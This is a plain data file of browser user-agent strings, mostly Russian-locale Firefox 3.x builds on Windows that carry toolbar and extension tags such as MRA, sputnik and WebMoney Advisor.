Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.19) Gecko/20110420 Firefox/3.5.19 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.5 (build 02842) Firefox/3.5.7 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.5 (build 02842) Firefox/3.5.7 (.NET CLR 3.5.30729) sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.26) Gecko/20120128 Firefox/3.6.26 sputnik 2.4.0.60
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.17) Gecko/2009122116 MRA 5.6 (build 03270) AdCentriaIM/1.7 Firefox/3.0.17 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.15) Gecko/2009101601 MRA 5.4 (build 02614) AdCentriaIM/1.7 Firefox/3.0.15
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.26) Gecko/20120128 MRA 5.7 (build 03797) Firefox/3.6.26 (.NET CLR 3.5.30729) sputnik 2.5.2.32
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.13 YB/3.6.13 GTB7.0 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.19) Gecko/20110420 Firefox/3.5.19 sputnik 2.5.2.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.26) Gecko/20120128 Firefox/3.6.26 sputnik 2.5.2.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.1) Gecko/2008070208 MRA 5.5 (build 02812) Firefox/3.0.1 GTB6 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7 sputnik 2.5.0.166
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.5 (build 02842) Firefox/3.5.7 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; ru; rv:1.9.2.26) Gecko/20120128 Firefox/3.6.26
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.5 (build 02842) Firefox/3.5.7 (.NET CLR 3.5.30729) sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7 (.NET CLR 3.5.30729) FBSMTWB
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.11) Gecko/2009060215 MRA 5.6 (build 03270) Firefox/3.0.11 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.17) Gecko/2009122116 MRA 5.5 (build 02842) Firefox/3.0.17 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.3 (build 02564) Firefox/3.5.7 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.26) Gecko/20120128 Firefox/3.6.26 ( .NET CLR 3.5.30729) sputnik 2.5.2.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17 sputnik 2.5.0.142
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2) Gecko/20100115 AdCentriaIM/1.7 Firefox/3.6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.6 (build 03278) Firefox/3.5.7 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.25) Gecko/20111212 MRA 5.6 (build 03399) Firefox/3.6.25 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.6 (build 03278) Firefox/3.5.7
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7 GTB6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.5 (build 02842) Firefox/3.5.7 (.NET CLR 2.0.50727) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.2; en-GB; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.3 (build 02552) Firefox/3.5.7 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.6) Gecko/20091201 MRA 5.5 (build 03122) Firefox/3.5.6 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.27) Gecko/20120216 MRA 5.7 (build 03797) Firefox/3.6.27
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 Firefox/3.0.19 sputnik 2.5.2.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.17) Gecko/2009122116 Firefox/3.0.17 (.NET CLR 3.5.30729) sputnik 2.0.1.37
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.27) Gecko/20120216 Firefox/3.6.27 sputnik 2.5.2.14
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.7) Gecko/20091221 AdCentriaIM/1.7 Firefox/3.5.7 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.4 (build 02647) AdCentriaIM/1.7 Firefox/3.5.7
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.7) Gecko/20091221 AdCentriaIM/1.7 MRA 5.5 (build 02842) Firefox/3.5.7 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.25) Gecko/20111212 MRA 5.7 (build 03797) Firefox/3.6.25 sputnik 2.5.0.142
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru-RU; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.0.19) Gecko/2010031422 AdCentriaIM/1.7 Firefox/3.0.19
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.5 (build 02842) Firefox/3.5.7 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.27) Gecko/20120216 Firefox/3.6.27
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7 GTBDFff GTB7.0 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.3a2pre) Gecko/20100211 Minefield/3.7a2pre
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 AskTbALSV5/3.14.1.20007 Firefox/3.6
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.27) Gecko/20120216 MRA 5.7 (build 03796) Firefox/3.6.27
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.5 (build 02842) Firefox/3.5.7 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru-RU; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.1.6) Gecko/20091216 Fedora/3.5.6-1.fc11 Firefox/3.5.6
Mozilla/5.0 (Windows NT 6.1; rv:9.0.1) Gecko/20111222 Firefox/9.0.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.17) Gecko/2009122116 MRA 5.6 (build 03278) Firefox/3.0.17 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1) Gecko/20090624 Firefox/3.5 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 AskTbPTV/3.12.2.16749 Firefox/3.5.5 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.1) Gecko/2008070208 Firefox/2.0.0.13;MEGAUPLOAD 1.0 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.5 (build 03122) Firefox/3.5.7
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 GTB7.1 (.NET CLR 3.5.30729) sputnik 2.5.0.142
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.5 (build 02842) Firefox/3.6 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.0; ru; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.6 (build 03278) Firefox/3.6 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.24) Gecko/20111103 Firefox/3.5.7;MEGAUPLOAD 1.0
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.5 (build 02842) Firefox/3.5.8 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.27) Gecko/20120216 MRA 5.5 (build 02842) Firefox/3.6.27 (.NET CLR 3.5.30729) sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8 (.NET CLR 3.5.30729) sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.7) Gecko/20100713 MRA 5.7 (build 03796) Firefox/3.6.7 sputnik 2.5.0.142
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.27) Gecko/20120216 Firefox/3.6.27 sputnik 2.5.2.20
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.5 (build 02842) Firefox/3.5.8 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.27) Gecko/20120216 Firefox/3.6.27 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 AdCentriaIM/1.7 Firefox/3.5.8 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 MRA 5.4 (build 02647) Firefox/3.5.5 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8 (.NET CLR 3.0.04506.30)
Mozilla/5.0 (Windows NT 5.1; rv:8.0a1) Gecko/20110815 Firefox/8.0a1
Mozilla/5.0 (Windows; U; Windows NT 5.0; ru; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.5 (build 02842) Firefox/3.5.8 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.27) Gecko/20120216 Firefox/3.6.27 sputnik 2.5.2.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.6 (build 03270) Firefox/3.5.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.18) Gecko/2010020220 Firefox/3.0.18 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.27) Gecko/20120216 Firefox/3.6.27 (.NET CLR 3.5.30729) sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.4 (build 02652) Firefox/3.5.8 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 sputnik 2.5.2.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1) Gecko/20090624 Firefox/3.5 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.7 (build 03796) Firefox/3.6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 AdCentriaIM/1.7 MRA 5.4 (build 02647) Firefox/3.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.5 (build 02842) Ant.com Toolbar 2.0 Firefox/3.6 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.27) Gecko/20120216 Firefox/3.6.27 (.NET CLR 3.5.30729) sputnik 2.5.2.14
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.27) Gecko/20120216 Firefox/3.6.27 GTB7.1 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8 GTB6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.6 (build 03278) Firefox/3.5.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.17) Gecko/20110420 MRA 5.5 (build 02842) Firefox/3.6.17 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 sputnik 2.5.2.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 Ant.com Toolbar 2.0 Firefox/3.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 (.NET CLR 3.5.30729) sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 (.NET CLR 3.5.30729) sputnik 2.5.2.14
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.4 (build 02652) Firefox/3.5.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6 GTBDFff GTB7.0 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.18) Gecko/2010020220 Firefox/3.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.18) Gecko/2010020220 MRA 5.3 (build 02560) Firefox/3.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.8.1.20) Gecko/20081217 MRA 5.6 (build 03278) Firefox/2.0.0.20 GTB6 sputnik
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.5 (build 02842) Firefox/3.6 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.5 (build 02842) Firefox/3.5.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.4 (build 02603) Firefox/3.5.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.28) Gecko/20120306 MRA 5.7 (build 03797) Firefox/3.6.28 (.NET CLR 3.5.30729) sputnik 2.5.2.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.0; ru; rv:1.9.0.18) Gecko/2010020220 Firefox/3.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.6 (build 03278) Firefox/3.5.8 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 sputnik 2.5.2.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.4 (build 02652) Firefox/3.5.8 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8 GTB6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.27) Gecko/20120216 Firefox/3.6.27 ( .NET CLR 3.5.30729; .NET4.0E) sputnik 2.5.2.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.19) Gecko/20110420 Firefox/3.5.19 sputnik 2.5.2.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.5 (build 02842) Firefox/3.5.8 (.NET CLR 3.5.30729) sputnik 2.0.1.41
Mozilla/5.0 (Windows NT 6.1; rv:11.0; eToolKit) Gecko/20100101 Firefox/11.0
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.5 (build 02776) Firefox/3.6 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.5.1.2
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.6 (build 03278) Firefox/3.5.8 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.6 (build 03278) Firefox/3.5.8 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 sputnik 2.5.2.20
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6 sputnik 2.5.2.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 BTRS35926 Firefox/3.6.11
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.9) Gecko/2009040821 Firefox/3.0.9 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.5.2.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 sputnik 2.5.2.48
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.18) Gecko/2010020220 MRA 5.5 (build 02842) Firefox/3.0.18 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.9) Gecko/20100315 Firefox/3.5.9 (.NET CLR 3.5.30729) sputnik 2.5.2.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6 sputnik 2.1.0.18 FBSMTWB
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 sputnik 2.5.2.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.3a1pre) Gecko/20090821 Minefield/3.7a1pre
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.25) Gecko/20111212 MRA 5.7 (build 03797) Firefox/3.6.25 (.NET CLR 3.5.30729) sputnik 2.5.2.32
Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko/20100101 Firefox/11.0 WebMoney Advisor
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2) Gecko/20100301 Ubuntu/9.10 (karmic) Firefox/3.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 AdCentriaIM/1.7 Firefox/3.5.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9b5pre) Gecko/2008032304 Minefield/3.0b5pre
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.5 (build 03122) Firefox/3.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9) Gecko/2008052906 MRA 5.4 (build 02647) Firefox/3.0 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.28) Gecko/20120306 MRA 5.6 (build 03278) Firefox/3.6.28 sputnik 2.5.0.150 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.5 (build 02812) Firefox/3.5.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 sputnik 2.5.0.150
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.6 (build 03270) Firefox/3.6 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2) Gecko/20100115 MRA 5.6 (build 03270) Firefox/3.6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6
Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.17) Gecko/2009122116 Firefox/3.0.17 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.27) Gecko/20120216 MRA 5.7 (build 03797) Firefox/3.6.27 sputnik 2.5.2.20
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.6 (build 03270) Firefox/3.6 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 sputnik 2.5.0.142
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 Firefox/3.0.10;MEGAUPLOAD 1.0
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.6 (build 03270) Firefox/3.6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.23) Gecko/20110920 AskTbAVR-W1/3.11.3.15924 Firefox/3.6.23 sputnik 2.5.2.20
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.20) Gecko/20081217 Firefox/2.0.0.20 WebMoney Advisor MRA 5.4 (build 02647);
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6 GTB5 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.3 (build 02543) Firefox/3.5.8 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 GTB6 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.0; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.3 (build 02560) Firefox/3.6 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2) Gecko/20100115 MRA 5.5 (build 02842) Firefox/3.6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.6 (build 03278) Firefox/3.6 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 ( .NET CLR 3.5.30729) sputnik 2.5.2.54
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 sputnik 2.5.0.160
Mozilla/5.0 (Windows NT 5.2; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 sputnik 2.5.2.20
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.0.10) Gecko/2009042513 Ubuntu/8.04 (hardy) Firefox/3.0.10
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 Firefox/2.0;MEGAUPLOAD 1.0 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.2) Gecko/20100316 MRA 5.5 (build 02842) Firefox/3.6.2 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.2) Gecko/20100316 MRA 5.5 (build 02842) Firefox/3.6.2 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7 (.NET CLR 1.1.4322)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.3 (build 02560) Firefox/3.5.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6 GTB6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 DefView Firefox/3.5.7
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5;fdnet
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2 GTBDFff GTB7.0
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2) Gecko/20100115 MRA 5.3 (build 02552) Firefox/3.6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2 (.NET CLR 3.5.30729) sputnik 2.1.0.18
